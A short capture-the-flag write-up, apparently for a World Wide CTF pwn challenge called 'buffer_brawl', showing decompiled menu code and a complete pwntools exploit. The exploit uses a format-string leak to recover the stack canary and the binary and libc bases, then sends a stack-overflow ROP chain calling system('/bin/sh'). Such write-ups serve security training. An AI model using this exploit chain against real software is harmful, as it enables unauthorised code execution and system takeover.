---
date: 
tier: easy
author: naibu3
ctf: World Wide CTF
---
# Overview

# Reconocimiento

```c
void menu(void)

{
  long in_FS_OFFSET;
  undefined4 input;
  undefined8 local_40;
  
  local_40 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  do {
    puts("");
    puts("Choose:");
    puts("1. Throw a jab");
    puts("2. Throw a hook");
    puts("3. Throw an uppercut");
    puts("4. Slip");
    puts("5. Call off");
    printf("> ");
    __isoc99_scanf(&DAT_001021ad,&input);
    switch(input) {
    default:
      puts("Invalid choice. Try again.");
      break;
    case 1:
      jab();
      break;
    case 2:
      hook();
      break;
    case 3:
      uppercut();
      break;
    case 5:
      TKO();
    case 4:
      slip();
    }
  } while( true );
}
```

# Explotación

```python
#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./buffer_brawl")

shell.sendlineafter(b"> ", b"4")
shell.sendlineafter(b"?\n", b"%11$p.%13$p")

leak = shell.recvline().strip().split(b".")

canary = int(leak[0], 16)
binary_base = int(leak[1], 16) - 0x1747

payload = b"%7$sPWN\x00" + p64(binary_base + 0x3fa0) # puts@got

shell.sendlineafter(b"> ", b"4")
shell.sendlineafter(b"?\n", payload)

libc_base = u64(shell.recvuntil(b"PWN")[:-3].ljust(8, b"\x00")) - 0x80e50

for i in range(29):
    shell.sendlineafter(b"> ", b"3")

offset = 24
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(canary)
payload += b"B" * 8
payload += p64(libc_base + 0x02a3e5) # pop rdi; ret;
payload += p64(libc_base + 0x1d8678) # "/bin/sh"
payload += p64(libc_base + 0x0f8c92) # ret;
payload += p64(libc_base + 0x050d70) # system()

shell.sendlineafter(b": ", payload)
shell.recvline()
shell.interactive()
```